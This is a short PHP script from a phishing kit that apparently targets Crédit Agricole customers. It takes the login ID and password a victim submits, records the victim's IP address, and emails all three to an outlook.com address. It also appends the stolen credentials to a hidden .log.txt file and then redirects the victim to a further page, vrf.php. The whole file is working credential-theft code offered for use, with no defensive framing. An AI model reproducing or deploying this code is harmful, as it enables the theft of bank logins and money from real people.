<?

$ip = $_SERVER['REMOTE_ADDR'];
$message .= "====================== login ca =====================\n";
$message .= "id  : ".$_POST['CCPTE']."\n";
$message .= "Mot de passe : ".$_POST['CCCRYC']."\n";
$message .= "login|".$ip."\n";
$message .= "====================== login 2018 =====================\n";
$send = "myrezultlikan@outlook.com";
$subject = "  || $ip";
$headers = "From: <myrezultlikan@outlook.com>";
mail($send,$subject,$message,$from);
		  $fp = fopen('.log.txt', 'a');
          fwrite($fp, $message);
          fclose($fp);
header("Location:vrf.php");

?>	